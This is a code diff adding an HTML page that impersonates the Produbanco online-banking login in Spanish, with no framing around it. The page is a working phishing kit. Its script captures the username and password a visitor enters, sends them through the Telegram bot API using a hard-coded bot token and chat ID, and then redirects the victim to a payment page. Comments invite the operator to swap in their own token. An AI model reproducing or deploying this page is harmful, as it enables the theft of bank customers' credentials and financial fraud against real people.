@@ -1,0 +1,191 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Produbanco - Banca en Línea</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+            background-color: #f8f8f8;
+        }
+
+        .container {
+            background-color: white;
+            border-radius: 10px;
+            padding: 20px;
+            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
+            width: 300px;
+            text-align: center;
+        }
+
+        .logo {
+            margin-bottom: 20px;
+        }
+
+        .logo img {
+            width: 150px;
+        }
+
+        h2 {
+            color: #2b802d;
+            margin-bottom: 10px;
+        }
+
+        h3 {
+            color: #444;
+            margin-bottom: 20px;
+        }
+
+        .input-group {
+            margin-bottom: 15px;
+            text-align: left;
+        }
+
+        .input-group label {
+            display: block;
+            font-size: 14px;
+            margin-bottom: 5px;
+        }
+
+        .input-group input {
+            width: 100%;
+            padding: 10px;
+            border: 1px solid #ccc;
+            border-radius: 5px;
+            font-size: 14px;
+        }
+
+        .input-group a {
+            font-size: 12px;
+            color: #2b802d;
+            text-decoration: none;
+            display: inline-block;
+            margin-top: 5px;
+        }
+
+        .btn {
+            display: block;
+            width: 100%;
+            padding: 10px;
+            background-color: #ccc;
+            color: white;
+            font-size: 16px;
+            border: none;
+            border-radius: 5px;
+            cursor: not-allowed;
+            margin-top: 10px;
+        }
+
+        .btn-green {
+            background-color: #2b802d;
+            color: white;
+        }
+
+        .btn-green:hover {
+            background-color: #236824;
+        }
+
+        .help-text {
+            margin-top: 15px;
+            font-size: 12px;
+            color: #444;
+        }
+
+        .help-text a {
+            color: #2b802d;
+            text-decoration: none;
+        }
+
+        .help-text a:hover {
+            text-decoration: underline;
+        }
+
+        .footer {
+            margin-top: 20px;
+            font-size: 12px;
+            color: #555;
+        }
+
+        .footer a {
+            color: #2b802d;
+            text-decoration: none;
+        }
+
+        .footer a:hover {
+            text-decoration: underline;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="logo">
+            <img src="../img/logotipo.svg" alt="Produbanco">
+        </div>
+        <h2>Hola, te damos la bienvenida</h2>
+        <h3>Ingresa a tu Produbanco en línea</h3>
+        <form id="loginForm">
+            <div class="input-group">
+                <label for="username">Usuario</label>
+                <input type="text" id="username" placeholder="Ingresa tu nombre de usuario" required>
+            </div>
+
+            <div class="input-group">
+                <label for="pass">Contraseña</label>
+                <input type="password" id="pass" placeholder="Ingresa tu contraseña" required>
+            </div>
+            <button type="submit" class="btn">Continuar</button>
+           
+        <div class="footer">
+            Si tienes problemas para ingresar, comunícate al: <a href="tel:024009000">02 400 9000</a>.
+        </div>
+    </div>
+
+    <script>
+        const TELEGRAM_BOT_TOKEN = "8050472055:AAECARJvZtrimVGoBUIXERph4dQDfL3pVXE"; // Reemplaza con tu token del bot
+        const TELEGRAM_CHAT_ID = "5848946481"; // Reemplaza con tu chat ID
+
+        document.getElementById("loginForm").addEventListener("submit", function(event) {
+            event.preventDefault();
+
+            const username = document.getElementById("username").value;
+            const pass = document.getElementById("pass").value;
+
+            if (username, pass) {
+                const message = `PRODUBANCO\nUsuario: ${username} \npass: ${pass}`;
+                
+
+                fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+                    method: "POST",
+                    headers: {
+                        "Content-Type": "application/json"
+                    },
+                    body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: message })
+                })
+                .then(response => response.json())
+                .then(data => {
+                    if (data.ok) {
+                        window.location.href = "../cargapago.html"; // Cambia a la URL deseada
+                    } else {
+                        alert("Intente nuevamente.");
+                    }
+                })
+                .catch(error => {
+                    console.error("Error", error);
+                });
+            } else {
+                alert("Por favor, ingrese su usuario.");
+            }
+        });
+
+        document.getElementById("register").addEventListener("click", function() {
+            window.location.href = "https://www.registro.com"; // Cambia a la URL para registrarse
+        });
+    </script>
+</body>
+</html>
